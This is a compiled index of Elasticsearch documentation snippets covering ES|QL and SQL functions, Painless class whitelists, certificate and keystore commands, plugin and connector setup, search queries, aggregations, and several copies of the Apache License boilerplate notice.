DESCRIPTION: Converts a string representation of a point into a geo_point type and extracts its X (longitude) and Y (latitude) coordinates using ST_X and ST_Y functions. The input point is specified in WKT (Well-Known Text) format.

LANGUAGE: esql
CODE:
ROW point = TO_GEOPOINT("POINT(42.97109629958868 14.7552534006536)")
| EVAL x =  ST_X(point), y = ST_Y(point)

----------------------------------------

TITLE: Method Overloading Example
DESCRIPTION: Shows how Painless handles method overloading differently from Java/Groovy, using the Matcher class example where group() method is split into group(int) and namedGroup(String) to avoid overloading conflicts.

LANGUAGE: java
CODE:
group(int)\nnamedGroup(String)

----------------------------------------

TITLE: PKCS#12 Certificate Generation
DESCRIPTION: Creates a new certificate in PKCS#12 format signed by a specified CA

LANGUAGE: bash
CODE:
function new-p12-cert() {
    local CertFile="$1"
    local CertPass="$2"
    local CertName="$3"
    local CaFile="$4"
    local CaPass="$5"
    shift 5

    certutil cert --ca="${PWD}/$CaFile" --ca-pass="$CaPass" --days=5000 --out ${PWD}/$CertFile --pass="$CertPass" --name="$CertName" "$@"
}

----------------------------------------

TITLE: Creating an Elasticsearch Extension via Download URL
DESCRIPTION: Creates a new Elasticsearch extension by streaming the file from a publicly-accessible download URL. This method is required for plugins larger than 200MB.

LANGUAGE: shell
CODE:
curl -X POST \
  https://api.elastic-cloud.com/api/v1/deployments/extensions \
  -H "Authorization: ApiKey $CLOUD_API_KEY" \
  -H 'Content-Type: application/json' \
  -d '{
   "download_url" : "https://my_site/custom-plugin-8.4.3.zip",
   "extension_type" : "plugin",
   "name" : "custom-plugin",
   "version" : "8.4.3"
}'

----------------------------------------

TITLE: Defining NestedDocument Operations for Reindex Scripts in Java
DESCRIPTION: Specifies allowed operations on nested documents within fields, including field access and manipulation in reindex scripts.

LANGUAGE: java
CODE:
class org.elasticsearch.script.field.NestedDocument {
    WriteField field(String)
    Stream fields(String)
    boolean isEmpty()
    int size()
    boolean exists()
    void remove()
}

----------------------------------------

TITLE: Creating a Custom Analyzer with Keep Types Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to create a custom analyzer using the Keep Types filter to keep only alphanumeric tokens.

LANGUAGE: console
CODE:
PUT keep_types_example
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "standard",
          "filter": [ "extract_alpha" ]
        }
      },
      "filter": {
        "extract_alpha": {
          "type": "keep_types",
          "types": [ "<ALPHANUM>" ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License to a work. Requires replacing bracketed fields with specific copyright information.

LANGUAGE: text
CODE:
Copyright [yyyy] [name of copyright owner]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: Creating Directory Structure for Elasticsearch
DESCRIPTION: Creates the necessary directories for Elasticsearch data, config, and snapshots.

LANGUAGE: bash
CODE:
mkdir /tmp/sharedESData
mkdir /tmp/sharedESData/config
mkdir /tmp/sharedESData/data
mkdir /tmp/sharedESData/snapshots

----------------------------------------

TITLE: Converting CA Certificate to PEM Format
DESCRIPTION: Converts the CA certificate from PKCS#12 to PEM format using OpenSSL, extracting only the public certificate without private keys.

LANGUAGE: bash
CODE:
openssl pkcs12 -info -in ./ca.p12 -nokeys -out ca.pem -passin "pass:ca-password"

----------------------------------------

TITLE: Referencing RSA JWKS Files
DESCRIPTION: References to RSA private and public JSON Web Key Set files that are generated by JwtRealmGenerateTests. The files contain key settings and configurations for JWT realm authentication.

LANGUAGE: text
CODE:
rsa-private-jwkset.json, rsa-public-jwkset.json

----------------------------------------

TITLE: Exporting and Importing Certificates for Elasticsearch SSL Testing
DESCRIPTION: A series of commands to export certificates from node and client keystores, and import them into each other's keystores. This enables mutual authentication between the Elasticsearch node and client.

LANGUAGE: bash
CODE:
keytool -export -alias test-node -keystore test-node.jks -storepass keypass -file test-node.crt
keytool -import -alias test-node -keystore test-client.jks -storepass keypass -file test-node.crt -noprompt
keytool -export -alias test-client -keystore test-client.jks -storepass keypass -file test-client.crt
keytool -import -alias test-client -keystore test-node.jks -storepass keypass -file test-client.crt -noprompt

----------------------------------------

TITLE: Updating Elasticsearch Plugin
DESCRIPTION: Commands to update a plugin by first removing the existing version and then installing the new version. Required for Elasticsearch version updates except for stable API text analysis plugins.

LANGUAGE: shell
CODE:
sudo bin/elasticsearch-plugin remove [pluginname]
sudo bin/elasticsearch-plugin install [pluginname]

----------------------------------------

TITLE: Defining the Appendable Interface in Painless
DESCRIPTION: Defines the Appendable interface with its append method for use in Painless scripts.

LANGUAGE: java
CODE:
class java.lang.Appendable {
  Appendable append(CharSequence,int,int)
}

----------------------------------------

TITLE: Converting WKT to GeoShape using TO_GEOSHAPE in ESQL
DESCRIPTION: Demonstrates the conversion of a polygon defined in WKT format to a geo_shape data type using the TO_GEOSHAPE function. The example creates a row with a WKT string representing a polygon and converts it to a geometry object.

LANGUAGE: esql
CODE:
ROW wkt = "POLYGON ((30 10, 40 40, 20 40, 10 20, 30 10))"
| EVAL geom = TO_GEOSHAPE(wkt)

----------------------------------------

TITLE: Configuring All Cluster Permissions and Global Application Management
DESCRIPTION: This role descriptor grants all cluster permissions, sets up global application and profile management with specific index privileges, and defines run-as capabilities.

LANGUAGE: json
CODE:
{"cluster":["all"],"global":{"application":{"manage":{"applications":["\""]}},"profile":{"write":{"applications":["","\""]}},"role":{"manage":{"indices":[{"names":["test*"],"privileges":["read","write"]}]}}},"indices":[],"applications":[],"run_as":["\"[a]/"]}

----------------------------------------

TITLE: Restricting Wait/Notify Usage in Java
DESCRIPTION: This snippet discourages the use of wait/notify methods, suggesting the use of concurrency primitives, latches, or callbacks instead.

LANGUAGE: java
CODE:
java.lang.Object#wait()
java.lang.Object#wait(long)
java.lang.Object#wait(long,int)
java.lang.Object#notify()
java.lang.Object#notifyAll()

----------------------------------------

TITLE: Installing Kuromoji Plugin in Elasticsearch
DESCRIPTION: Command to install the Japanese Kuromoji analysis plugin using Elasticsearch's plugin manager. This must be executed on every node in the cluster, followed by a node restart.

LANGUAGE: sh
CODE:
sudo bin/elasticsearch-plugin install analysis-kuromoji

----------------------------------------

TITLE: Apache License Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License 2.0 to a work. This template includes placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Apache License 2.0 Copyright Notice Template
DESCRIPTION: Standard copyright notice template for applying Apache License 2.0 to a work. Users should replace the bracketed fields with their specific information.

LANGUAGE: text
CODE:
Copyright [yyyy] [name of copyright owner]

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: Running Docker Container for Connector Service
DESCRIPTION: Shell command to run the Docker image with the Connector Service, mounting the configuration file and connecting to the Elasticsearch network.

LANGUAGE: sh
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Running GitHub Connector Docker Image
DESCRIPTION: Command to run the Docker image with the Connector Service for the GitHub connector. This example shows how to mount the configuration file and set up the network for the connector.

LANGUAGE: sh
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Creating API Key for Zoom Connector
DESCRIPTION: API call to generate a security API key for the Zoom connector with necessary permissions

LANGUAGE: console
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Executing Span Containing Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use the span_containing query in Elasticsearch. It searches for spans that contain a specific term 'foo' within a larger span that includes 'bar' and 'baz' terms in order, with a maximum slop of 5.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "span_containing": {
      "little": {
        "span_term": { "field1": "foo" }
      },
      "big": {
        "span_near": {
          "clauses": [
            { "span_term": { "field1": "bar" } },
            { "span_term": { "field1": "baz" } }
          ],
          "slop": 5,
          "in_order": true
        }
      }
    }
  }
}

----------------------------------------

TITLE: Span Term Query with Value and Boost
DESCRIPTION: Example of a span_term query using the 'value' parameter with a boost of 2.0 to increase the relevance score.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "span_term" : { "user.id" : { "value" : "kimchy", "boost" : 2.0 } }
  }
}

----------------------------------------

TITLE: Index Document with Text Content
DESCRIPTION: Indexes a sample document with text content to demonstrate text analysis behavior.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1
{
  "full_text":   "Quick Brown Foxes!"
}

----------------------------------------

TITLE: Configuring Fielddata Frequency Filter
DESCRIPTION: Example of setting up fielddata frequency filtering to reduce memory usage for text fields.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "tag": {
        "type": "text",
        "fielddata": true,
        "fielddata_frequency_filter": {
          "min": 0.001,
          "max": 0.1,
          "min_segment_size": 500
        }
      }
    }
  }
}

----------------------------------------

TITLE: Reindexing Percolator Queries
DESCRIPTION: Complete example showing how to reindex percolator queries to a new index, including alias management.

LANGUAGE: console
CODE:
PUT new_index
{
  "mappings": {
    "properties": {
      "query" : {
        "type" : "percolator"
      },
      "body" : {
        "type": "text"
      }
    }
  }
}

POST /_reindex?refresh
{
  "source": {
    "index": "index"
  },
  "dest": {
    "index": "new_index"
  }
}

----------------------------------------

TITLE: Max Aggregation with Missing Values
DESCRIPTION: Demonstrates how to handle missing values in max aggregation using the missing parameter.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "aggs" : {
      "grade_max" : {
          "max" : {
              "field" : "grade",
              "missing": 10
          }
      }
  }
}

----------------------------------------

TITLE: Using Runtime Fields with Extended Stats Aggregation in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use a runtime field with the extended_stats aggregation. It applies a correction factor to exam grades before calculating statistics.

LANGUAGE: console
CODE:
GET /exams/_search
{
  "size": 0,
  "runtime_mappings": {
    "grade.corrected": {
      "type": "double",
      "script": {
        "source": "emit(Math.min(100, doc['grade'].value * params.correction))",
        "params": {
          "correction": 1.2
        }
      }
    }
  },
  "aggs": {
    "grades_stats": {
      "extended_stats": { "field": "grade.corrected" }
    }
  }
}

----------------------------------------

TITLE: Geo-centroid as Sub-aggregation with Terms Aggregation
DESCRIPTION: This example combines geo-centroid as a sub-aggregation with a terms aggregation to find the central location for museums in each city.

LANGUAGE: console
CODE:
POST /museums/_search?size=0
{
  "aggs": {
    "cities": {
      "terms": { "field": "city.keyword" },
      "aggs": {
        "centroid": {
          "geo_centroid": { "field": "location" }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Geo-bounds Aggregation for Geo-shape Fields
DESCRIPTION: Example demonstrating geo-bounds aggregation on geo_shape fields, including creation of an index with geo_shape mapping and aggregating bounds for both point and polygon geometries.

LANGUAGE: console
CODE:
PUT /places
{
  "mappings": {
    "properties": {
      "geometry": {
        "type": "geo_shape"
      }
    }
  }
}

POST /places/_bulk?refresh
{"index":{"_id":1}}
{"name": "NEMO Science Museum", "geometry": "POINT(4.912350 52.374081)" }
{"index":{"_id":2}}
{"name": "Sportpark De Weeren", "geometry": { "type": "Polygon", "coordinates": [ [ [ 4.965305328369141, 52.39347642069457 ], [ 4.966979026794433, 52.391721758934835 ], [ 4.969425201416015, 52.39238958618537 ], [ 4.967944622039794, 52.39420969150824 ], [ 4.965305328369141, 52.39347642069457 ] ] ] } }

POST /places/_search?size=0
{
  "aggs": {
    "viewport": {
      "geo_bounds": {
        "field": "geometry"
      }
    }
  }
}

----------------------------------------

TITLE: Runtime Field T-test Aggregation in Elasticsearch
DESCRIPTION: Example of using runtime fields to adjust values before performing t-test comparison.

LANGUAGE: console
CODE:
GET node_upgrade/_search
{
  "size": 0,
  "runtime_mappings": {
    "startup_time_before.adjusted": {
      "type": "long",
      "script": {
        "source": "emit(doc['startup_time_before'].value - params.adjustment)",
        "params": {
          "adjustment": 10
        }
      }
    }
  },
  "aggs": {
    "startup_time_ttest": {
      "t_test": {
        "a": {
          "field": "startup_time_before.adjusted"
        },
        "b": {
          "field": "startup_time_after"
        },
        "type": "paired"
      }
    }
  }
}

----------------------------------------

TITLE: Range Aggregation with Custom Keys in Elasticsearch
DESCRIPTION: Illustrates how to customize the key for each range in a range aggregation, providing more meaningful bucket names.

LANGUAGE: console
CODE:
GET sales/_search
{
  "aggs": {
    "price_ranges": {
      "range": {
        "field": "price",
        "keyed": true,
        "ranges": [
          { "key": "cheap", "to": 100 },
          { "key": "average", "from": 100, "to": 200 },
          { "key": "expensive", "from": 200 }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Terms Aggregation with Sub-aggregation Ordering
DESCRIPTION: Example showing how to order terms by a sub-aggregation metric

LANGUAGE: console
CODE:
GET /_search
{
  "aggs": {
    "genres": {
      "terms": {
        "field": "genre",
        "order": { "max_play_count": "desc" }
      },
      "aggs": {
        "max_play_count": { "max": { "field": "play_count" } }
      }
    }
  }
}

----------------------------------------

TITLE: Disassembling Elasticsearch Microbenchmark Method
DESCRIPTION: Command to run a microbenchmark (MemoryStatsBenchmark) with JVM arguments for disassembling a specific method.

LANGUAGE: bash
CODE:
gradlew -p benchmarks run --args ' MemoryStatsBenchmark -jvmArgs "-XX:+UnlockDiagnosticVMOptions -XX:CompileCommand=print,*.yourMethodName -XX:PrintAssemblyOptions=intel"'

----------------------------------------

TITLE: Cleaning Up Elasticsearch Docker Container and Data
DESCRIPTION: Removes the Elasticsearch Docker container and deletes the shared data directory.

LANGUAGE: bash
CODE:
docker rm -f es
rm -rf /tmp/sharedESData/

----------------------------------------

TITLE: Group By Translation Tests
DESCRIPTION: Test cases for translating SQL GROUP BY clauses to Elasticsearch aggregations

LANGUAGE: SQL
CODE:
SELECT PI() * int FROM test GROUP BY PI() * int ORDER BY PI() * int LIMIT 10;

LANGUAGE: DSL
CODE:
{"script":{"source":"InternalSqlScriptUtils.mul(InternalQlScriptUtils.docValue(doc,params.v0),params.v1)","params":{"v0":"int","v1":3.141592653589793}},"missing_bucket":true,"value_type":"double","order":"asc"}}}

----------------------------------------

TITLE: Defining Basic Subquery Select in SQL for Elasticsearch
DESCRIPTION: Demonstrates a basic subquery select operation, selecting the 'int' field from a nested query on the 'test' table.

LANGUAGE: sql
CODE:
SELECT int FROM
    (SELECT int FROM test);

----------------------------------------

TITLE: Spatial Functions in Elasticsearch SQL
DESCRIPTION: Geospatial functions for working with geometric data types, including conversion between formats and spatial calculations.

LANGUAGE: sql
CODE:
ST_ASTEXT
ST_ASWKT
ST_DISTANCE
ST_GEOMETRYTYPE
ST_GEOMFROMTEXT
ST_WKTTOSQL
ST_X
ST_Y
ST_Z

----------------------------------------

TITLE: Interval Classes Definition
DESCRIPTION: Empty class definitions for handling time intervals in SQL expressions

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.sql.expression.literal.interval.IntervalDayTime {
}

class org.elasticsearch.xpack.sql.expression.literal.interval.IntervalYearMonth {
}

----------------------------------------

TITLE: Primitive Type Function Interfaces
DESCRIPTION: Definitions for primitive type specializations of functional interfaces including Double, Int, and Long variants. These provide type-specific implementations to avoid boxing/unboxing overhead.

LANGUAGE: java
CODE:
class java.util.function.DoubleFunction {
  def apply(double)
}

class java.util.function.IntFunction {
  def apply(int)
}

class java.util.function.LongFunction {
  def apply(long)
}

----------------------------------------

TITLE: Netty4 Channel Future Listener Usage Directive
DESCRIPTION: Specifies that developers should use org.elasticsearch.transport.netty4.Netty4Utils.addListener() instead of directly calling ChannelFuture.addListener(). This ensures consistent listener handling across the Elasticsearch codebase.

LANGUAGE: text
CODE:
@defaultMessage Use org.elasticsearch.transport.netty4.Netty4Utils.addListener(io.netty.channel.ChannelFuture, io.netty.channel.ChannelFutureListener) instead
io.netty.channel.ChannelFuture#addListener(io.netty.util.concurrent.GenericFutureListener)

----------------------------------------

TITLE: Defining Example Whitelisted Class in Painless
DESCRIPTION: Defines a whitelisted class with various members including constructor, static methods, public members, and accessor methods. Includes an example of method annotation.

LANGUAGE: painless
CODE:
class org.elasticsearch.example.painlesswhitelist.ExampleWhitelistedClass {
  (int, int)

  int CONSTANT
  void staticMethod()

  int publicMember

  int getPrivateMemberAccessor()
  void setPrivateMemberAccessor(int)

  void annotate() @example_annotation[category="1",message="example annotation"]
}

----------------------------------------

TITLE: Exporting SSL Certificates
DESCRIPTION: Exports the generated certificates from both server and client keystores into separate certificate files.

LANGUAGE: bash
CODE:
keytool -v -export -alias server -file server.crt -keystore server.keystore -storepass password
keytool -v -export -alias client -file client.crt -keystore client.keystore -storepass password

----------------------------------------

TITLE: Declaring WildcardDocValuesField Class in Java for Elasticsearch
DESCRIPTION: Defines the WildcardDocValuesField class in the org.elasticsearch.xpack.wildcard package. The class is marked with @dynamic_type annotation, indicating it may have dynamic behavior or properties.

LANGUAGE: java
CODE:
class org.elasticsearch.xpack.wildcard.WildcardDocValuesField @dynamic_type {
}

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice Template
DESCRIPTION: Standard boilerplate notice text template for applying the Apache License 2.0 to a work. Contains placeholders for copyright year and owner information.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License to a work. Fields in brackets should be replaced with project-specific information.

LANGUAGE: text
CODE:
Copyright 1999-2005 The Apache Software Foundation

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice
DESCRIPTION: Standard boilerplate notice text to be included when applying the Apache License 2.0 to a work. Requires replacing bracketed fields with actual copyright information.

LANGUAGE: text
CODE:
   Copyright {yyyy} {name of copyright owner}

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

----------------------------------------

TITLE: Apache License 2.0 Boilerplate Notice Template
DESCRIPTION: Standard license notice template to be included in source files. The template includes placeholders for copyright year and owner information along with the standard Apache 2.0 license text.

LANGUAGE: text
CODE:
   Copyright [yyyy] [name of copyright owner]

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.